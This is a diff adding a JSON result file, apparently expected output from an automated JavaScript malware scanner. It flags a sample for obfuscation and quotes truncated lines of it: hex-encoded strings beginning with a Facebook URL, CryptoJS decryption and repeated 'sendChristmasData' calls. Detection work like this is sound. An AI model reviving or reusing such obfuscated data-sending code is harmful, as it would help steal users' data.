@@ -1,0 +1,118 @@
+{
+  "extra": {
+    "drop_file": false,
+    "score": 21,
+    "sections": [
+      {
+        "auto_collapse": false,
+        "body": "Sample consists of a long single line of code",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 0,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 10,
+          "score": 1,
+          "score_map": {},
+          "signatures": {}
+        },
+        "promote_to": null,
+        "tags": {},
+        "title_text": "Long One-Liner",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": null,
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 0,
+        "heuristic": null,
+        "promote_to": null,
+        "tags": {},
+        "title_text": "Signatures",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "The prefix '_0x' in names of variables and functions suggests that obfuscated code exists\n\t\tvar _0x6ce0=[\"\\x68\\x74\\x74\\x70\\x73\\x3A\\x2F\\x2F\\x77\\x77\\x77\\x2E\\x66\\x61\\x63\\x65\\x62\\x6F\\x6F\\x6B\\x2E\\x...\n\t\tconst url=_0x6ce0[0]\n\t\tconst keyStr=_0x6ce0[1]\n\t\tconst htmlurl=_0x6ce0[2]\n\t\tconst apibasequeryurl1=_0x6ce0[3]\n\t\tconst apibasequeryurl2=_0x6ce0[4]\n\t\tconst apibasequeryurl3=_0x6ce0[4]\n\t\tconst ccbasequeryurl1=_0x6ce0[5]\n\t\tconst ccbasequeryurl2=_0x6ce0[6]\n\t\tconst ccbasequeryurl3=_0x6ce0[7]\n\t\t[105 Mark(s) Truncated]",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 10,
+          "score_map": {
+            "_0x_prefix": 10
+          },
+          "signatures": {
+            "_0x_prefix": 1
+          }
+        },
+        "promote_to": null,
+        "tags": {},
+        "title_text": "Signature: ObfuscationPrefix",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "JavaScript uses CryptoJS for obfuscating/de-obfuscating a string\n\t\tvar _0x85b5x1c=CryptoJS[_0x6ce0[27]][_0x6ce0[26]](_0x85b5x1b,CryptoJS[_0x6ce0[21]][_0x6ce0[20]][_0x6...\n\t\tlog(_0x6ce0[28]+ _0x85b5x1c.toString(CryptoJS[_0x6ce0[21]].Utf8))},error:function(_0x85b5x1d,_0x85b5...\n\t\tvar _0x85b5x34=CryptoJS[_0x6ce0[21]][_0x6ce0[20]][_0x6ce0[19]](keyStr)\n\t\tvar _0x85b5x35=CryptoJS[_0x6ce0[27]][_0x6ce0[64]](_0x85b5x33,_0x85b5x34,{mode:CryptoJS[_0x6ce0[23]][...\n\t\t$[_0x6ce0[30]]({url:s3fileurl1,success:function(_0x85b5x1b){var _0x85b5x1c=CryptoJS[_0x6ce0[27]][_0x...\n\t\tvar _0x85b5x37=_0x85b5x1c.toString(CryptoJS[_0x6ce0[21]].Utf8)\n\t\tsendChristmasData(_0x85b5x37,_0x85b5x36)},error:function(_0x85b5x1d,_0x85b5x1e,_0x85b5x1f){$[_0x6ce0...\n\t\tsendChristmasData(_0x85b5x37,_0x85b5x36)},error:function(_0x85b5x1d,_0x85b5x1e,_0x85b5x1f){$[_0x6ce0...\n\t\tsendChristmasData(_0x85b5x37,_0x85b5x36)},error:function(_0x85b5x1d,_0x85b5x1e,_0x85b5x1f){$[_0x6ce0...\n\t\ttry{var _0x85b5x34=CryptoJS[_0x6ce0[21]][_0x6ce0[20]][_0x6ce0[19]](keyStr)\n\t\tvar _0x85b5x3c=CryptoJS[_0x6ce0[27]][_0x6ce0[26]](_0x85b5x1b,_0x85b5x34,{mode:CryptoJS[_0x6ce0[23]][...",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 10,
+          "score_map": {
+            "crypto_js_obfuscation": 10
+          },
+          "signatures": {
+            "crypto_js_obfuscation": 1
+          }
+        },
+        "promote_to": null,
+        "tags": {},
+        "title_text": "Signature: CryptoJSObfuscation",
+        "zeroize_on_tag_safe": false
+      }
+    ]
+  },
+  "files": {
+    "extracted": [],
+    "supplementary": []
+  },
+  "results": {
+    "heuristics": [
+      {
+        "attack_ids": [],
+        "heur_id": 3,
+        "signatures": [
+          "_0x_prefix"
+        ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 3,
+        "signatures": [
+          "crypto_js_obfuscation"
+        ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 10,
+        "signatures": []
+      }
+    ],
+    "tags": {},
+    "temp_submission_data": {}
+  }
+}
